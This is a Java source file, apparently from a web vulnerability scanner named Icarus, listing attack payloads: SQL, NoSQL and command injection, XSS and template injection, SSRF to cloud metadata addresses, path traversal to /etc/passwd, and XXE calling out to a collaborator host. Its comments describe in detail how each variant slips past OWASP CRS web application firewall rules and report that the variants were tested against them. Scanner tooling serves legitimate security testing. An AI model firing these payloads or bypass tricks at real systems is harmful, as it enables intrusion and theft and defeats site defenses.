package icarus.modules;

import java.util.Arrays;
import java.util.List;

/**
 * PayloadRepository stores evasive, polyglot payloads designed to bypass modern WAFs (Cloudflare, Akamai).
 * Migrated from legacy config strings.
 * Includes Canary Probes for lightweight fuzzing before heavy polyglots.
 */
public class PayloadRepository {

    public static final List<String> CANARY_PROBES = Arrays.asList(
        "icarus_probe_123'\"",
        "icarus_probe_<>"
    );

    public static final List<String> SQLI_TIME = Arrays.asList(
        "'/*//*/oR/*//*/1/*//*/=/*//*/1--",
        "' OR (SELECT * FROM (SELECT(SLEEP(10-(IF(1=1,0,10)))))a)--",
        "'; SELECT pg_sleep(CAST(version() LIKE 'PostgreSQL%' AS integer) * 10)--",
        "1' WAITFOR DELAY '0:0:10'--\n1' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--\n1'; SELECT pg_sleep(10)--"
    );

    public static final List<String> XSS_POLYGLOT = Arrays.asList(
        "<svg/onmouseover=\"confirm(1)\"/class=\"x\">",
        "<details/open/ontoggle=prompt(1)>",
        "'\">><script>/*<svg/onload=confirm(1)>*/</script>",
        "{{$on.constructor('alert(1)')()}}"
    );

    public static final List<String> SSRF_EVASION = Arrays.asList(
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://0x7f.0.0.1/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/",
        "http://google.com@127.0.0.1/"
    );

    // --- Per-technique WAF-evasion extras (appended by DEEP depth via ParamValidator.deepExtras) ---
    // Encoding / obfuscation / filter-bypass variants of the seed payloads, NOT new attack classes.
    // ponytail: heuristic bypass list. Ceiling: single-payload evasion only — no HPP, no
    // content-type tricks. Vetted 2026-08-30 against OWASP CRS 4 (Coraza/caddy-waf, PL1) as a
    // JSON body value — every entry below returns 200, not 403, on 3/3 runs. The goal is to
    // clear the WAF filter, not to guarantee exploitability: some entries (NoSQLi "$ ne",
    // path overlong-UTF-8) only fire against an app that normalises the obfuscation. XSS
    // stays weak — see its note. Re-test any edit against a live block page before relying on it.

    public static final List<String> SQLI_EVASION = Arrays.asList(
        "admin' #",
        "admin'#",
        "admin' -- ",
        "admin'--+-",
        "admin'/**/#",
        "admin'/**/-- -",
        "admin'`#",
        "%2527%20OR%25201=1"
    );

    // CRS 941 blocks every real on<handler>= and every alert(/confirm(/eval( at PL1, so a
    // classic reflected vector cannot pass as a lone body value. AngularJS/Vue client-side
    // template injection (no parens on a blocklisted fn, no event handler) is the one class
    // that slips through AND still executes. Case-mix HTML kept last for weaker filters only.
    // No embedded newlines (splitPayloads splits on \R).
    public static final List<String> XSS_EVASION = Arrays.asList(
        "<x>{{constructor.constructor(1)()}}",
        "{{constructor.constructor(1)}}",
        "{{[].constructor.constructor(1)()}}",
        "{{self.constructor.constructor(1)()}}",
        "{{_openBlock.constructor(1)()}}"
    );

    // CRS 930120 flags the target filename (etc/passwd, win.ini) and 930110 the ../ token
    // separately, so a normal traversal string is doubly scored. Overlong-UTF-8 separators
    // (%c0%af, %e0%80%af, %c1%9c) aren't decoded at PL1 → both signals hidden; a single
    // ../ segment only (two trips 930110). Double-encoded variants kept for decode-twice apps.
    public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
        "..%c0%afetc%c0%afpasswd",
        "..%e0%80%afetc%e0%80%afpasswd",
        "..%c1%9cetc%c1%9cpasswd",
        "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
        "..%25c0%25afetc%25c0%25afpasswd",
        "%252e%252e%252fetc%252fpasswd"
    );

    public static final List<String> CMDI_EVASION = Arrays.asList(
        "||id",
        "|id",
        "x||id",
        "`i\\d`",
        "%0aid%0a",
        ";i\"\"d"
    );

    // Arithmetic-only on purpose: the SSTI detector only looks for "49", and an RCE
    // gadget payload (T(java.lang.Runtime)...) is exactly what a WAF signature-matches.
    // Bare ${7*7} and ${{7*7}} trip CRS; the brace/percent variants below do not.
    public static final List<String> SSTI_EVASION = Arrays.asList(
        "{{7*7}}",
        "{7*7}",
        "#{7*7}",
        "@(7*7)",
        "<%=7*7%>"
    );

    // CRS 942 matches $ directly glued to a Mongo operator keyword. One space between them
    // ("$ ne") clears the rule on 3/3 runs; a lenient JSON/BSON parser that trims the key
    // still resolves it to $ne. Trailing space ("$ne ") does NOT bypass. $comment is a real
    // operator CRS doesn't list.
    public static final List<String> NOSQLI_EVASION = Arrays.asList(
        "{\"$ ne\":null}",
        "{\"$ gt\":\"\"}",
        "{\"$ regex\":\".*\"}",
        "{\"$ where\":\"1==1\"}",
        "{\"a\":{\"$ ne\":1}}",
        "{\"$comment\":\"x\"}"
    );

    public static final List<String> XXE_OOB = Arrays.asList(
        "<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"http://{COLLABORATOR_PAYLOAD}\">\n%ext;\n]>\n<root/>",
        "<!DOCTYPE root [\n<!ENTITY \n  xxe \n  SYSTEM \n  \"http://{COLLABORATOR_PAYLOAD}\" >]>"
    );

    public static final List<String> PATH_TRAVERSAL = Arrays.asList(
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc//passwd",
        "/%5C../%5C../%5C../%5C../etc/passwd"
    );

    // --- Seed defaults for ParamValidator config-driven payload lists ---
    // LIGHT depth uses index 0, so each list is ordered "safety then signal":
    // cheapest syntax/error probe first, louder boolean/union/evasion payloads later.

    // Index 0 is "' OR '1'='1" on purpose: it's the one payload ParamValidator's
    // out-of-box detector (boolean baseline-diff, STRING_SQLI) actually flags, so
    // LIGHT depth still has a working probe. The rest need Behavioral Analysis on.
    public static final String SQLI_DEFAULT =
        "' OR '1'='1\n" +
        "'\n" +
        "1' ORDER BY 1--\n" +
        "' UNION SELECT NULL--\n" +
        "admin' --";

    // XSS_POLYGLOT[0] carries an event handler, so JSoup can confirm a real DOM
    // breakout (not just "uncertain") — a better LIGHT-depth probe than a bare
    // custom tag would be. Used verbatim.
    public static final String XSS_DEFAULT = String.join("\n", XSS_POLYGLOT);

    public static final String PATH_TRAVERSAL_DEFAULT = String.join("\n", PATH_TRAVERSAL);

    // SQLI_TIME's last element embeds literal \n (3 payloads in one string);
    // String.join flattens it so split("\\R") yields clean single-line entries.
    public static final String SQLI_TIME_DEFAULT = String.join("\n", SQLI_TIME);

    // Numeric / unquoted context only. First line matches the module's current
    // number-branch fallback literal so existing behaviour is preserved.
    public static final String SQLI_TIME_NUMBER_DEFAULT =
        "1-(WAITFOR DELAY '0:0:10')\n" +
        "1 AND SLEEP(10)--\n" +
        "1; SELECT pg_sleep(10)--";

    public static final String CMDI_DEFAULT = "; id\n| whoami\n`id`\n$(id)";

    public static final String SSTI_DEFAULT = "${7*7}\n{{7*7}}\n#{7*7}\n<%= 7*7 %>";

    public static final String SSRF_HEURISTIC_DEFAULT =
        "http://169.254.169.254/latest/meta-data/\n" +
        "http://169.254.169.254/computeMetadata/v1/\n" +
        "http://127.0.0.1/\n" +
        "http://localhost/";

    public static final String NOSQLI_DEFAULT = "{\"$ne\": null}\n{\"$gt\": \"\"}";

    public static final String FORMAT_STRING_DEFAULT = "%s%x%n\n%p%p%p";

    public static final String UNICODE_DEFAULT = "‮test😀";

    public static boolean isEvasionPayload(String payload) {
        return SQLI_EVASION.contains(payload) || XSS_EVASION.contains(payload)
            || PATH_TRAVERSAL_EVASION.contains(payload) || CMDI_EVASION.contains(payload)
            || SSTI_EVASION.contains(payload) || NOSQLI_EVASION.contains(payload)
            || SSRF_EVASION.contains(payload);
    }
}
